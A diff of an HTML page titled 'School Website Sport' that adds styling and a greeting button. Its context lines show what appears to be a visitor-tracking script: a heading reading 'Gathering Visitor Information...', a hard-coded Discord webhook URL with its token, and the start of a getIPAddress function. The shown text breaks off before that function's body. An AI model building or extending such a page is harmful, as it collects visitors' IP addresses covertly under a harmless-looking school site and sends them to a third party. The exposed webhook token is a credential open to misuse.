@@ -6,20 +6,50 @@
     <title>School Website Sport</title>
     <style>
         body {
-    background: linear-gradient(to right, #add8e6, #dda0dd);
-    color: #ffffff;
-    font-family: Arial, sans-serif;
-    text-align: center;
-    height: auto; /* Allow height to grow based on content */
-    margin: 0;
-    padding: 20px; /* Add some spacing for readability */
-    overflow-y: auto; /* Ensure vertical scrolling is enabled */
-}
+            background: linear-gradient(to right, #add8e6, #dda0dd);
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            height: auto; /* Allow height to grow based on content */
+            margin: 0;
+            padding: 20px; /* Add some spacing for readability */
+            overflow-y: auto; /* Ensure vertical scrolling is enabled */
+        }
+
+        h1 {
+            font-size: 2em;
+            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        button {
+            background: #dda0dd;
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            font-size: 1.2em;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        button:hover {
+            background: #add8e6;
+        }
+
+        button:active {
+            transform: scale(1.1); /* Add a smooth pop-up effect */
+        }
     </style>
 </head>
 <body>
     <h1>Gathering Visitor Information...</h1>
+    <button onclick="sayHi()">Click Me</button>
+
     <script>
+        function sayHi() {
+            alert('Hi!');
+        }
+
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
 
         function getIPAddress() {
